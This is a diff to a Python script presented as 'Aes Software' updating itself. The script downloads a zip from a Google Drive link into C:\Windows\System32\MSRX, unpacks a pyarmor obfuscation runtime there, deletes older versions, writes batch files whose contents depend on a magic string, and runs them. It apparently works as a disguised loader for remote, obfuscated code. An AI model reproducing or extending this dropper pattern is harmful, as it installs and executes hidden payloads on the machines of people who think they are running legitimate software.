@@ -147,9 +147,9 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSRX\AesV8.5.py"
+    aesv3_path = r"C:\Windows\System32\MSRX\AesV8.6.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSRX\AesV8.4.py",
+        r"C:\Windows\System32\MSRX\AesV8.5.py",
         r"C:\Windows\System32\MSRX\aesv1.bat",
         r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
     ]
@@ -168,7 +168,7 @@ def delete_files_if_aesv3_missing():
                     print("")
                     print("Aes Software is updating, please don't close the window.")
                     print("Change log:")
-                    print("---Improve security.")
+                    print("---Fixed an issue where software couldn't download the AES Driver.")
                     print("")
                     print("")
     else:
@@ -182,8 +182,8 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\MSRX\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1IWWWnw6IgwXlrenybmroIpjG3lht01Te", "C:\\Windows\\System32\\MSRX\\piprich.zip")
-    zip_file = r'C:\Windows\System32\MSRX\piprich.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1Hiwd5pda2xluupedlaDIE5as6opFkE9Z", "C:\\Windows\\System32\\MSRX\\mydrx.zip")
+    zip_file = r'C:\Windows\System32\MSRX\mydrx.zip'
     extract_dir = r'C:\Windows\System32\MSRX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -226,9 +226,9 @@ if file_contentsx1=="deleteaesFILES":
     os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.5.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
 else:
-    create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.5.py")
+    create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
 def run_batch_file(batch_file_path):
     try:
         subprocess.run([batch_file_path], shell=True, check=True)
